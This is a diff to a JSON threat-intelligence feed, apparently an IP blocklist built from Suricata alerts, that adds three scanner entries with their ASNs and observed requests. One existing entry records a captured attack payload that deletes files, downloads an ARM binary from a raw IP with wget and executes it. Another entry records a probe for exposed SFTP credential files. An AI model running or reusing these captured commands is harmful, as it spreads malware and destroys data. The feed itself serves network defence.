@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-08T01:00:00Z",
+  "generated_at": "2026-10-08T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 1247,
-    "v4": 1247,
+    "total": 1250,
+    "v4": 1250,
     "v6": 0
   },
   "items": [
@@ -20429,6 +20429,62 @@
       "asn_prefix": "41.47.176.0/20",
       "payloads": [
         "GET /shell?cd+/tmp;rm+-rf+*;wget http://144.31.150.183/5r3fqt67ew531has4231.arm; chmod 777 5r3fqt67ew531has4231.arm; ./5r3fqt67ew531has4231.arm; rm -rf *"
+      ]
+    },
+    {
+      "ip": "219.117.219.36",
+      "family": "v4",
+      "first_seen": "2026-10-08T10:00:00Z",
+      "last_seen": "2026-10-08T10:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN SFTP/FTP Password Exposure via sftp-config.json"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "2514",
+      "asn_prefix": "219.117.192.0/18",
+      "payloads": [
+        "GET /sftp-config.json"
+      ]
+    },
+    {
+      "ip": "20.80.107.199",
+      "family": "v4",
+      "first_seen": "2026-10-08T09:00:00Z",
+      "last_seen": "2026-10-08T09:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /ReportServer"
+      ]
+    },
+    {
+      "ip": "20.169.84.243",
+      "family": "v4",
+      "first_seen": "2026-10-08T11:00:00Z",
+      "last_seen": "2026-10-08T11:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.160.0.0/12",
+      "tags": [
+        "mwl:cloud=\"azure\""
       ]
     }
   ]
